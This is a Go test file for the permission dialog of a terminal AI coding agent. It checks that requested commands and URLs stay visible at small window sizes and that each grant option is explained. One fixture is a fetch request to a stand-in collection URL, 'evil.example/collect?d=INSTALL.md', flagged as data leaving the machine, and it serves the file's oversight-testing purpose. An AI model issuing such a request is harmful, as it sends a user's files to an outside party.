package dialog

// GORILLA FIX (2026-10-23): the dialog must show the command or URL it asks
// about. On the MacBook Air (80x24 Terminal, auto-approve on) every dialog
// showed "Command" or "URL" with nothing under it: the auto-approve banner
// and the header took every row of a box 40% of the window high, so the
// viewport holding the command was given a height of zero or less. Two
// identical screenshots, the owner's and the harness's, 2026-10-23.

import (
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/opencode-ai/opencode/internal/llm/tools"
	"github.com/opencode-ai/opencode/internal/permission"
)

// dialogAt renders a request in a window of the given size.
func permissionDialogAt(t *testing.T, w, h int, req permission.PermissionRequest) string {
	t.Helper()
	p := NewPermissionDialogCmp().(*permissionDialogCmp)
	p.Update(tea.WindowSizeMsg{Width: w, Height: h})
	p.SetPermissions(req)
	return p.View()
}

// flat removes the wrapping so a long command can be searched for whole.
func flat(s string) string {
	var b strings.Builder
	for _, line := range strings.Split(s, "\n") {
		b.WriteString(strings.TrimSpace(strings.Trim(strings.TrimSpace(line), "│╭╮╰╯─")))
	}
	return strings.Join(strings.Fields(b.String()), "")
}

func TestTheDialogShowsTheCommandAndURLInFull(t *testing.T) {
	const reason = "this turn has already read untrusted content (web page fetched from https://raw.githubusercontent.com/gorillanobakaa-dot/Fieldkit/main/README.md), and this can send data off the machine"
	cases := []struct {
		name string
		req  permission.PermissionRequest
		want string
	}{
		{"bash, evidence row 4", permission.PermissionRequest{
			ID: "b1", ToolName: tools.BashToolName, Action: "execute", Path: "/Users/stranger/Stranger-Test",
			GrantKey: "python3 install.py --prefix /Users/stranger/Stranger-Test", AutoApproveOverridden: reason,
			Params: tools.BashPermissionsParams{Command: "python3 install.py --prefix /Users/stranger/Stranger-Test"},
		}, "python3install.py--prefix/Users/stranger/Stranger-Test"},
		// The live clue from the Mac (2026-10-23 02:05): a long command with a
		// family showed (the family made the old box 70% high), a SHORT one
		// without a family rendered empty, as did every URL.
		{"bash, short single line", permission.PermissionRequest{
			ID: "b2", ToolName: tools.BashToolName, Action: "execute", Path: "/Users/stranger/Stranger-Test",
			GrantKey: "brew install git", AutoApproveOverridden: reason,
			Params: tools.BashPermissionsParams{Command: "brew install git"},
		}, "brewinstallgit"},
		{"fetch, evidence row 3", permission.PermissionRequest{
			ID: "f1", ToolName: tools.FetchToolName, Action: "fetch", Path: "/Users/stranger/Stranger-Test",
			GrantKey: "https://evil.example", Egress: true, AutoApproveOverridden: reason,
			Params: tools.FetchPermissionsParams{URL: "https://evil.example/collect?d=INSTALL.md"},
		}, "https://evil.example/collect?d=INSTALL.md"},
	}
	for _, size := range [][2]int{{80, 24}, {100, 30}, {160, 45}} {
		for _, c := range cases {
			out := permissionDialogAt(t, size[0], size[1], c.req)
			if !strings.Contains(flat(out), c.want) {
				t.Errorf("%dx%d %s: the dialog does not show %q:\n%s", size[0], size[1], c.name, c.want, out)
			}
			lines := strings.Split(out, "\n")
			if len(lines) > size[1] {
				t.Errorf("%dx%d %s: dialog is %d rows, taller than the window", size[0], size[1], c.name, len(lines))
			}
			for i, l := range lines {
				if lipgloss.Width(l) > size[0] {
					t.Errorf("%dx%d %s: row %d is %d columns wide", size[0], size[1], c.name, i, lipgloss.Width(l))
				}
			}
		}
	}
}

// A grant is never offered without the sentence that says what it covers:
// at any window size, "Allow family (f)" appears only together with the
// family's own text, and "Allow for session" with what the session covers.
func TestEveryOfferedGrantIsExplainedOnTheDialog(t *testing.T) {
	for _, size := range [][2]int{{80, 24}, {80, 30}, {120, 40}, {160, 45}} {
		r := familyRequest()
		r.AutoApproveOverridden = "it installs Python packages outside a project (pip3)"
		r.SessionClass = "python -c"
		out := flat(permissionDialogAt(t, size[0], size[1], r))
		if strings.Contains(out, "Allowfamily(f)") != strings.Contains(out, "Allowfamily(f)alsoallows") {
			t.Errorf("%dx%d: the family button and its explanation disagree:\n%s", size[0], size[1], out)
		}
		if !strings.Contains(out, "Allowforsession(s)covers:") {
			t.Errorf("%dx%d: Allow for session is offered without saying what it covers", size[0], size[1])
		}
		if !strings.Contains(out, "main(['cards','list'])") {
			t.Errorf("%dx%d: the command is not shown in full", size[0], size[1])
		}
	}
}
